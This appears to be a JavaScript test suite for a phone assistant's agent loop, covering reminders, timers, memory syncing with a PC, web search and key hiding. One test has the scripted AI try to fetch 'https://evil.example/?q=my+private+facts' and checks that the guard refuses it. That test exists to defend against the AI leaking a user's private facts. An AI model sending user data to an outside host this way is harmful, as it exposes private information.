// Checks the phone's standalone assistant (web/phone/brain.js) against a pretend app and a scripted AI: the tool loop, what is shown and what is
// kept back, reminders and timers, memory and how it is shared with the PC, and the rules that stop the AI being talked into odd requests.
import assert from 'node:assert/strict';
import { pathToFileURL } from 'node:url';
import path from 'node:path';

// ---- a pretend Android app (window.JarvisApp) ----
const store = new Map();
const reminders = [];
const calls = { llm: [], web: [] };
let script = [];                      // what the pretend AI answers, in order
let pages = {};                       // url -> text for the pretend web

globalThis.window = globalThis;
globalThis.DOMParser = class {
  parseFromString(text) {                       // just enough HTML for what brain.js reads
    const body = { textContent: text.replace(/<[^>]*>/g, ' ') };
    return { body, querySelectorAll: (sel) => (sel === '.result' ? [...text.matchAll(/<div class="result">([\s\S]*?)<\/div>/g)].map((m) => block(m[1])) : []) };
  }
};
function block(html) {
  const a = /<a class="result__a" href="([^"]*)">([^<]*)<\/a>/.exec(html);
  const s = /<span class="result__snippet">([^<]*)<\/span>/.exec(html);
  return { querySelector: (q) => (q === 'a.result__a' ? (a ? { getAttribute: () => a[1], textContent: a[2] } : null) : s ? { textContent: s[1] } : null) };
}
const respond = (id, obj) => setTimeout(() => globalThis.__net(id, JSON.stringify(obj)), 0);
globalThis.JarvisApp = {
  kvGet: (n) => store.get(n) || '',
  kvSet: (n, v) => { store.set(n, v); },
  keyCount: () => 2,
  keyNames: () => '["gemini: a","groq: b"]',
  importKeys: (json) => JSON.parse(json).length,
  llm: (id, body) => {
    const request = JSON.parse(body);
    calls.llm.push(request);
    const next = script.shift();
    respond(id, next ? { ok: true, body: JSON.stringify({ choices: [{ message: next }] }), model: 'test:model' } : { ok: false, error: 'script ran out' });
  },
  web: (id, url) => {
    calls.web.push(url);
    const hit = Object.entries(pages).find(([k]) => url.startsWith(k));
    respond(id, hit ? { ok: true, status: 200, url, text: hit[1] } : { ok: false, error: 'not found' });
  },
  pcPing: (id) => respond(id, { ok: true }),
  reminders: () => JSON.stringify(reminders.slice().sort((a, b) => a.due - b.due)),
  addReminder: (text, due) => {
    if (!String(text).trim()) return 'What should I remind you about?';
    if (due < Date.now() + 20000) return 'Pick a time at least a minute from now.';
    reminders.push({ id: `L${reminders.length + 1}`, text: String(text).trim(), due });
    return '';
  },
  deleteReminder: (id) => { const i = reminders.findIndex((r) => r.id === id); if (i >= 0) reminders.splice(i, 1); },
};
await import(pathToFileURL(path.resolve('web/phone/brain.js')).href);
const { Brain } = globalThis;

const say = (content) => ({ content });
const tool = (name, args, content = null) => ({ content, tool_calls: [{ id: `c_${name}`, type: 'function', function: { name, arguments: JSON.stringify(args) } }] });
async function ask(text, answers, history = []) {
  script = answers;
  const events = [];
  await Brain.run(text, history, (e) => events.push(e));
  return events;
}
const texts = (events) => events.filter((e) => e.type === 'text').map((e) => e.delta);
const fresh = () => { reminders.length = 0; calls.llm.length = 0; calls.web.length = 0; pages = {}; store.clear(); };

const checks = {
  async 'a plain answer comes back as text and then done'() {
    fresh();
    const ev = await ask('hi', [say('Good evening.')]);
    assert.deepEqual(texts(ev), ['Good evening.']);
    assert.equal(ev.at(-1).type, 'done');
    const sent = calls.llm[0];
    assert.equal(sent.messages[0].role, 'system');
    assert.match(sent.messages[0].content, /PC is not reachable/);
    assert.equal(sent.messages.at(-1).content, 'hi');
    assert.ok(sent.tools.length >= 8);
  },
  async 'a tool call runs, its result goes back, and only the final words are shown'() {
    fresh();
    const ev = await ask('remind me in 10 minutes to stretch', [tool('reminder', { action: 'add', text: 'stretch', minutes: 10 }, 'Sure thing.'), say('Reminder set. Do not forget.')]);
    assert.equal(reminders.length, 1);
    assert.equal(reminders[0].text, 'stretch');
    assert.ok(Math.abs(reminders[0].due - (Date.now() + 600000)) < 5000);
    assert.deepEqual(texts(ev), ['Reminder set. Do not forget.']);                       // "Sure thing." came with the tool call and is not shown twice
    const second = calls.llm[1].messages;
    assert.equal(second.at(-2).role, 'assistant');
    assert.equal(second.at(-2).tool_calls[0].id, 'c_reminder');
    assert.equal(second.at(-1).role, 'tool');
    assert.equal(second.at(-1).tool_call_id, 'c_reminder');
    assert.match(second.at(-1).content, /^Reminder saved for/);
    assert.ok(ev.some((e) => e.type === 'did' && /Reminder set/.test(e.text)));
  },
  async 'words that came with a tool call are used when nothing follows them'() {
    fresh();
    const ev = await ask('x', [tool('recall', { query: 'x' }, 'Let me look.'), say('')]);
    assert.deepEqual(texts(ev), ['Let me look.']);
  },
  async 'reminders: times are checked, listed and cancelled'() {
    fresh();
    await ask('x', [tool('reminder', { action: 'add', text: 'too soon', minutes: 0.1 }), say('ok')]);
    assert.equal(reminders.length, 0);
    assert.match(calls.llm[1].messages.at(-1).content, /^Error: Pick a time/);
    await ask('x', [tool('reminder', { action: 'add', text: 'later' }), say('ok')]);
    assert.match(calls.llm[3].messages.at(-1).content, /^Error: say when/);
    await ask('x', [tool('reminder', { action: 'add', text: 'at five', at: '23:59' }), say('ok')]);
    assert.equal(reminders.length, 1);
    await ask('x', [tool('reminder', { action: 'list' }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /at five/);
    await ask('x', [tool('reminder', { action: 'cancel', text: 'FIVE' }), say('ok')]);
    assert.equal(reminders.length, 0);
  },
  async 'timers are reminders that start with "Timer done" and can be cancelled'() {
    fresh();
    await ask('x', [tool('timer', { action: 'start', minutes: 5, label: 'pasta' }), say('ok')]);
    assert.equal(reminders[0].text, 'Timer done: pasta');
    await ask('x', [tool('timer', { action: 'start', minutes: 0.1 }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /^Error: a timer is from/);
    await ask('x', [tool('timer', { action: 'cancel', label: 'PASTA' }), say('ok')]);
    assert.equal(reminders.length, 0);
  },
  async 'memory: remember, no duplicates, recall, forget, and what is sent to the PC'() {
    fresh();
    await ask('x', [tool('remember', { fact: 'My sister is called Mia', kind: 'person' }), say('ok')]);
    await ask('x', [tool('remember', { fact: 'my sister is called mia' }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /Already known/);
    let kept = JSON.parse(store.get('facts'));
    assert.equal(kept.added.length, 1);
    assert.equal(kept.added[0].kind, 'person');
    await ask('what is my sister called', [say('Mia.')]);
    assert.match(calls.llm.at(-1).messages[0].content, /sister is called Mia/);              // facts are in the standing instructions
    const lid = kept.added[0].lid;
    await ask('x', [tool('forget', { id: lid }), say('ok')]);
    kept = JSON.parse(store.get('facts'));
    assert.equal(kept.added.length, 0);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /Forgotten/);
  },
  async 'syncing with the PC: new facts are sent, acknowledged ones are dropped, the PC\'s list and character arrive'() {
    fresh();
    await ask('x', [tool('remember', { fact: 'likes tea' }), say('ok')]);
    let sentBody = null;
    const ok = await Brain.sync(async (p, body) => {
      sentBody = body;
      return { facts: [{ id: 7, fact: 'likes tea', kind: 'preference', pinned: false }, { id: 3, fact: 'lives in Fremont', kind: 'fact', pinned: true }],
        created: sentBody.added.map((a) => ({ lid: a.lid, id: 7 })), character: 'You are JARVIS, extra dry.', weather: { name: 'Fremont', lat: 1, lon: 2, units: 'f' } };
    });
    assert.equal(ok, true);
    assert.equal(sentBody.added.length, 1);
    assert.equal(sentBody.added[0].fact, 'likes tea');
    const kept = JSON.parse(store.get('facts'));
    assert.deepEqual(kept.added, []);
    assert.equal(kept.list.length, 2);
    await ask('hello', [say('hi')]);
    assert.match(calls.llm.at(-1).messages[0].content, /^You are JARVIS, extra dry\./);
    assert.match(calls.llm.at(-1).messages[0].content, /lives in Fremont/);
    assert.equal(await Brain.sync(async () => null), false);                                   // the PC is off: nothing is lost
  },
  async 'forgetting a fact the PC knows is queued for the PC and hidden at once'() {
    fresh();
    await Brain.sync(async () => ({ facts: [{ id: 3, fact: 'old fact', kind: 'fact', pinned: false }], created: [], character: '', weather: null }));
    await ask('x', [tool('forget', { id: '3' }), say('ok')]);
    assert.deepEqual(JSON.parse(store.get('facts')).removed, [3]);
    await ask('hi', [say('hi')]);
    assert.doesNotMatch(calls.llm.at(-1).messages[0].content, /old fact/);
    let body = null;
    await Brain.sync(async (p, b) => { body = b; return { facts: [], created: [], character: '', weather: null }; });
    assert.deepEqual(body.removed, [3]);
    assert.deepEqual(JSON.parse(store.get('facts')).removed, []);
  },
  async 'web search lists results and only those pages (or ones the user typed) can be opened'() {
    fresh();
    pages['https://html.duckduckgo.com/html/'] = '<div class="result"><a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCanberra">Canberra</a><span class="result__snippet">The capital.</span></div>';
    pages['https://en.wikipedia.org/wiki/Canberra'] = '<p>Canberra is the capital of Australia.</p>';
    pages['https://evil.example/'] = 'secret';
    await ask('x', [tool('web_search', { query: 'capital of australia' }), say('ok')]);
    const found = calls.llm[1].messages.at(-1).content;
    assert.match(found, /Outside content/);
    assert.match(found, /en\.wikipedia\.org\/wiki\/Canberra/);
    await ask('x', [tool('fetch_url', { url: 'https://en.wikipedia.org/wiki/Canberra' }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /Canberra is the capital/);
    const before = calls.web.length;
    await ask('x', [tool('fetch_url', { url: 'https://evil.example/?q=my+private+facts' }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /only open pages that a search returned/);
    assert.equal(calls.web.length, before, 'a page the AI made up was fetched');
    await ask('read https://evil.example/ for me', [tool('fetch_url', { url: 'https://evil.example/' }), say('ok')]);
    assert.match(calls.llm.at(-1).messages.at(-1).content, /secret/);                         // the user typed that address themselves
  },
  async 'an AI failure is reported, never thrown, and never shows keys'() {
    fresh();
    const ev = await ask('hi', []);
    assert.equal(ev.at(-1).type, 'error');
    assert.doesNotMatch(JSON.stringify(ev), /key/i);
  },
  async 'a tool that does not exist is answered, not run'() {
    fresh();
    await ask('x', [tool('lights', { power: false }), say('ok')]);
    assert.match(calls.llm[1].messages.at(-1).content, /don't have a tool called lights/);
  },
  async 'it stops after six rounds'() {
    fresh();
    const ev = await ask('x', Array.from({ length: 8 }, () => tool('recall', { query: 'q' })));
    assert.equal(calls.llm.length, 6);
    assert.equal(ev.at(-1).type, 'notice');
  },
  async 'stopping ends it without more requests'() {
    fresh();
    const controller = new AbortController();
    script = [tool('recall', { query: 'q' }), say('never')];
    const events = [];
    const run = Brain.run('x', [], (e) => { events.push(e); if (e.type === 'progress') controller.abort(); }, controller.signal);
    await run;
    assert.equal(calls.llm.length, 1);
    assert.equal(texts(events).length, 0);
  },
  async 'the page never sees the AI keys'() {
    const source = (await import('node:fs')).readFileSync('web/phone/brain.js', 'utf8');
    assert.ok(!/AIza|Bearer |api[_-]?key/i.test(source), 'brain.js mentions keys');
    assert.equal(typeof Brain.keyNames()[0], 'string');
  },
};

let failed = 0;
for (const [name, run] of Object.entries(checks)) {
  try { await run(); console.log(`ok   ${name}`); } catch (e) { failed += 1; console.log(`FAIL ${name}\n     ${e.message}`); }
}
process.exit(failed ? 1 : 0);
